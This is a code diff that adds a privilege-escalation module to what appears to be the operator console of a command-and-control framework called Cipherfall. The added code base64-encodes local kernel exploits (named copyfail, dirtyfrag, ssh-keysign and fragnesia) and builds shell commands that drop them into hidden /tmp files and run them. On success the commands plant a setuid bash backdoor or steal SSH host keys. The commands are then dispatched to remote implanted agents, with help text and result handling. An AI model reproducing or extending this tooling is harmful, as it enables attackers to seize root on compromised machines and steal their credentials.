@@ -637,6 +637,108 @@ class TerminalTextArea(TextArea):
             self.move_cursor(self.document.end)
 
 
+_PRIVESC_DIR = HERE.parent / "Privesc"
+
+
+def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
+    bd = f"/tmp/.b{tag}"
+    if exploit == "copyfail":
+        src = _PRIVESC_DIR / "copyfail.py"
+        if not src.exists():
+            return None
+        script = src.read_text()
+        patched = script.replace('g.system("su")', 'g.system("su </dev/null 2>&1")')
+        b64 = base64.b64encode(patched.encode()).decode()
+        return (
+            f"BD={bd}; T=/tmp/.{tag}cf.py; "
+            f"printf '%s' '{b64}' | base64 -d > $T; "
+            f"python3 $T </dev/null 2>&1; "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /bin/su 2>/dev/null "
+            f"|| printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; "
+            f"if [ -u \"$BD\" ]; then "
+            f"echo '[privesc:ok] copyfail'; $BD -p -c 'id'; "
+            f"else echo '[privesc:fail] copyfail'; fi; rm -f $T"
+        )
+    if exploit == "dirtyfrag":
+        src = _PRIVESC_DIR / "dirtyfrag" / "exp"
+        if not src.exists():
+            return None
+        b64 = base64.b64encode(src.read_bytes()).decode()
+        return (
+            f"BD={bd}; T=/tmp/.{tag}df; "
+            f"printf '%s' '{b64}' | base64 -d > $T; chmod +x $T; "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
+            f"if [ ! -u \"$BD\" ]; then "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
+            f"if [ -u \"$BD\" ]; then "
+            f"echo '[privesc:ok] dirtyfrag'; $BD -p -c 'id'; "
+            f"else echo '[privesc:fail] dirtyfrag'; fi; rm -f $T"
+        )
+    if exploit == "ssh-keysign":
+        src = _PRIVESC_DIR / "ssh-keysign-pwn" / "sshkeysign_pwn"
+        if not src.exists():
+            return None
+        b64 = base64.b64encode(src.read_bytes()).decode()
+        return (
+            f"T=/tmp/.{tag}sk; "
+            f"printf '%s' '{b64}' | base64 -d > $T; chmod +x $T; "
+            f"echo '[ssh-keysign] stealing host keys...'; "
+            f"$T 2>&1; RC=$?; rm -f $T; "
+            f"[ $RC -eq 0 ] && echo '[ssh-keysign:ok]' || echo '[ssh-keysign:fail]'"
+        )
+    if exploit == "fragnesia":
+        src = _PRIVESC_DIR / "fragnesia.sh"
+        if not src.exists():
+            return None
+        b64 = base64.b64encode(src.read_bytes()).decode()
+        return (
+            f"T=/tmp/.{tag}fg.sh; "
+            f"printf '%s' '{b64}' | base64 -d > $T; "
+            f"printf 'id; exit\\n' | bash $T 2>&1; "
+            f"echo '[fragnesia:note] namespace-only — use relay for interactive exploit'; "
+            f"rm -f $T"
+        )
+    return None
+
+
+def _build_privesc_auto(tag: str) -> "str | None":
+    bd = f"/tmp/.b{tag}"
+    parts = []
+    cf_src = _PRIVESC_DIR / "copyfail.py"
+    df_src = _PRIVESC_DIR / "dirtyfrag" / "exp"
+    if cf_src.exists():
+        script = cf_src.read_text()
+        patched = script.replace('g.system("su")', 'g.system("su </dev/null 2>&1")')
+        b64cf = base64.b64encode(patched.encode()).decode()
+        parts.append(
+            f"if python3 -c 'import sys; assert sys.version_info>=(3,10)' 2>/dev/null; then "
+            f"T=/tmp/.{tag}cf.py; printf '%s' '{b64cf}' | base64 -d > $T; "
+            f"python3 $T </dev/null 2>&1; "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /bin/su 2>/dev/null "
+            f"|| printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; "
+            f"rm -f $T; "
+            f"if [ -u \"$BD\" ]; then echo '[privesc:ok] copyfail'; $BD -p -c 'id'; DONE=1; fi; "
+            f"[ -z \"$DONE\" ] && echo '[privesc:fail] copyfail'; fi"
+        )
+    if df_src.exists():
+        b64df = base64.b64encode(df_src.read_bytes()).decode()
+        parts.append(
+            f"if [ -z \"$DONE\" ]; then "
+            f"T=/tmp/.{tag}df; printf '%s' '{b64df}' | base64 -d > $T; chmod +x $T; "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
+            f"if [ ! -u \"$BD\" ]; then "
+            f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
+            f"rm -f $T; "
+            f"if [ -u \"$BD\" ]; then echo '[privesc:ok] dirtyfrag'; $BD -p -c 'id'; DONE=1; fi; "
+            f"[ -z \"$DONE\" ] && echo '[privesc:fail] dirtyfrag'; fi"
+        )
+    if not parts:
+        return None
+    prefix = f"BD={bd}; DONE=''; "
+    suffix = "; [ -z \"$DONE\" ] && echo '[privesc:fail] all exploits failed — target may be patched'"
+    return prefix + "; ".join(parts) + suffix
+
+
 _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
     "ghost": (
         "toggle audit blackout + env scrub (per-agent)",
@@ -735,6 +837,25 @@ _MODULE_DOCS: "dict[str, tuple[str, str]]" = {
   TUI auto-removes agent from DB on receipt of [suicide: ok].
   Root recommended for shred and auditctl.""",
     ),
+    "privesc": (
+        "run privilege escalation exploit on agent (copyfail/dirtyfrag/ssh-keysign/fragnesia)",
+        """/module privesc [copyfail|dirtyfrag|ssh-keysign|fragnesia]
+
+  Run a privilege escalation exploit on the selected agent.
+  Without argument: tries copyfail then dirtyfrag in order; stops on first root.
+
+  copyfail     AF_ALG+KTLS splice overwrite /bin/su → root shell (Python ≥ 3.10)
+  dirtyfrag    xfrm/RxRPC page-cache write  overwrite /usr/bin/su → root shell
+  ssh-keysign  race pidfd_getfd on ssh-keysign exit → steals SSH host keys (read-only)
+  fragnesia    user+net namespace setup (CVE-2026-46300 wrapper, interactive only)
+
+  On success (copyfail/dirtyfrag): plants SUID bash at /tmp/.b<tag>, runs id.
+  On failure: reports [privesc:fail] for each attempted exploit.
+  Root not required to run — exploit escalates from unprivileged user.
+
+  Note: binaries compiled for x86-64 Linux. NTP agents: run /module relay first
+  (dirtyfrag payload is ~78 KB, exceeds UDP/123 packet limit).""",
+    ),
     "list": (
         "list all available /module commands",
         "/module list\n\n  Print this list.",
@@ -762,6 +883,11 @@ _COMPLETIONS: list[str] = [
     "/module relay start ",
     "/module upload ",
     "/module download ",
+    "/module privesc",
+    "/module privesc copyfail",
+    "/module privesc dirtyfrag",
+    "/module privesc ssh-keysign",
+    "/module privesc fragnesia",
     "/module save",
     "/module save ",
     "/module suicide",
@@ -769,6 +895,7 @@ _COMPLETIONS: list[str] = [
     "/module help",
     "/module help ghost",
     "/module help heartbeat",
+    "/module help privesc",
     "/module help recon",
     "/module help relay",
     "/module help upload",
@@ -801,6 +928,7 @@ class CipherfallTUI(App):
     _download_sessions: dict[str, dict] = {}  # session_id -> state
     _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
     _suicide_tasks:     dict[str, str]  = {}  # task_id -> agent_id
+    _privesc_tasks:     dict[str, dict] = {}  # task_id -> {exploit, agent_id, tag}
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -1111,6 +1239,21 @@ class CipherfallTUI(App):
                         log.write(f"[red]DB cleanup error: {e}[/red]")
             else:
                 log.write("[dim]waiting for suicide confirmation…[/dim]")
+            return
+
+        px = self._privesc_tasks.get(task_id)
+        if px is not None:
+            out = task.get("output") or ""
+            if out:
+                log.write_raw(out.strip())
+                if "[privesc:ok]" in out:
+                    log.write("[bold green]root obtained — SUID bash planted[/bold green]")
+                elif "[ssh-keysign:ok]" in out:
+                    log.write("[bold green]ssh-keysign: host keys extracted[/bold green]")
+                elif "[privesc:fail] all" in out:
+                    log.write("[red]all exploits failed — target likely patched[/red]")
+            else:
+                log.write(f"[dim]running {px['exploit']} exploit…[/dim]")
             return
 
         dl = self._download_tasks.get(task_id)
@@ -1457,6 +1600,44 @@ class CipherfallTUI(App):
                     cmd = f"/module relay start 123 {_C2_HOST}:443"
                 elif len(parts) == 4 and parts[2] == "start":
                     cmd = f"/module relay start {parts[3]} {_C2_HOST}:443"
+        elif cmd.startswith("/module privesc"):
+            parts  = cmd.split()
+            tag    = uuid.uuid4().hex[:8]
+            agent_id = self._selected_agent
+            if len(parts) >= 3:
+                exploit = parts[2]
+                if exploit not in ("copyfail", "dirtyfrag", "ssh-keysign", "fragnesia"):
+                    log.clear()
+                    log.write(f"[red]unknown exploit '{exploit}' — choose: copyfail dirtyfrag ssh-keysign fragnesia[/red]")
+                    return
+                pcmd = _build_privesc_payload(exploit, tag)
+                if pcmd is None:
+                    log.clear()
+                    log.write(f"[red]exploit binary not found locally: Modules/Privesc/{exploit}[/red]")
+                    return
+            else:
+                exploit = "auto"
+                pcmd = _build_privesc_auto(tag)
+                if pcmd is None:
+                    log.clear()
+                    log.write("[red]no privesc binaries found in Modules/Privesc/[/red]")
+                    return
+            base_url = self._agent_base.get(agent_id, BASE)
+            try:
+                async with httpx.AsyncClient() as c:
+                    r = await c.post(f"{base_url}/admin/task",
+                                     json={"agent_id": agent_id, "command": pcmd},
+                                     timeout=3)
+                    result = r.json()
+            except Exception as e:
+                log.write(f"[red]dispatch error: {e}[/red]")
+                return
+            self._privesc_tasks[result["task_id"]] = {"exploit": exploit, "agent_id": agent_id, "tag": tag}
+            self._selected_task = result["task_id"]
+            log.clear()
+            log.write(f"[yellow]privesc ({exploit}) dispatched — tag {tag}[/yellow]")
+            await self._load_tasks(agent_id)
+            return
         elif cmd.startswith("/module save"):
             parts    = cmd.split(None, 2)
             agent_id = self._selected_agent
